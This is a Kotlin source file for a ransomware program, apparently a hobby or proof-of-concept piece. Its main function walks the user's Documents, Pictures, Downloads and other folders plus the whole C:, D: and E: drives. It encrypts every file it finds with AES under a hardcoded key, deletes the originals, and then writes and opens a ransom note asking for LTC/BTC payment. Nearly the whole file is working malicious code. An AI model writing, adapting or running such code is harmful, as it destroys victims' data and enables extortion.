import java.awt.Desktop
import java.io.FileOutputStream
import java.io.UnsupportedEncodingException
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.Paths
import java.security.MessageDigest
import java.security.NoSuchAlgorithmException
import java.util.*
import javax.crypto.spec.SecretKeySpec

private fun setKey(passedKey: String) : SecretKeySpec?{
    var secretKey: SecretKeySpec? = null
    var key: ByteArray
    val sha: MessageDigest?
    try {
        key = passedKey.toByteArray(charset("UTF-8"))
        sha = MessageDigest.getInstance("SHA-256")
        key = sha.digest(key)
        key = Arrays.copyOf(key, 16) //has to be length of 16
        secretKey = SecretKeySpec(key, "AES")
    } catch (e: NoSuchAlgorithmException) {
        e.printStackTrace()
    } catch (e: UnsupportedEncodingException) {
        e.printStackTrace()
    }
    return secretKey
}

/**
 * Displays nice welcome message to guest
 */
private fun welcomeMessage() {
    val message = "Uh oh it looks like your files have been encrypted" +
            "either pay the ransom or say bye-bye to your files to insert LTC/BTC address here"
    val out = FileOutputStream("""C:\welcome_message.txt""")
    out.write(message.toByteArray())
    out.close()
}

/**
 * Create javaClass and return it
 */
private fun createHandleCrypto() : handleCryptography{
    val javaClass = handleCryptography()
    return javaClass
}

fun main(args:Array<String>){
    val encFiles : MutableSet<Path> = mutableSetOf()
    val userHome = System.getProperty("user.home")
    val arrayofDirs = arrayOf(userHome + "\\Contacts\\",
            userHome + "\\Documents\\",
            userHome + "\\Downloads\\",
            userHome + "\\Favorites\\",
            userHome + "\\Links\\",
            userHome + "\\My Documents\\",
            userHome + "\\My Music\\",
            userHome + "\\My Pictures\\",
            userHome + "\\My Videos\\",
            "C:\\","D:\\", "E:\\")
    arrayofDirs.forEach {
        Files.walk(Paths.get(it)).forEach {
            //make sure not to encrypt your own files
            if (!(it.equals("handleLogic.kt") || it.equals("handleCryptography.java"))) {
                encFiles.add(it)
            }
        }
    }
    val passedKey = "test"
    val secretKey: SecretKeySpec? = setKey(passedKey)
    val cryptoClass = createHandleCrypto()
    for (path in encFiles) {
        if (!(path.toString().contains("(encrypted)"))) {
            cryptoClass.encryption(1,path.toString(),secretKey)
            try {
                path.toFile().delete()
            } catch (e: Exception) {
                continue
            }
        }
    }
    welcomeMessage()
    val desktop = Desktop.getDesktop()
    desktop.open(Paths.get("""C:\welcome_message.txt""").toFile())
    print("Try to decrypt? , Y/N")
    val response : String? = readLine()
    if (response.equals("Y")) {
        print("Take a stab at that password :)")
        val stab = readLine()
        try{
            print("enter filepath to try and decrypt")
            val file: String? = readLine()
            cryptoClass.encryption(2,file, setKey(stab.toString()))
        }
        catch(e: Exception){
            print("Better luck next time, bad password :/")
        }
    }
    else{
        print("Ok.........")
        System.exit(-42)
    }
}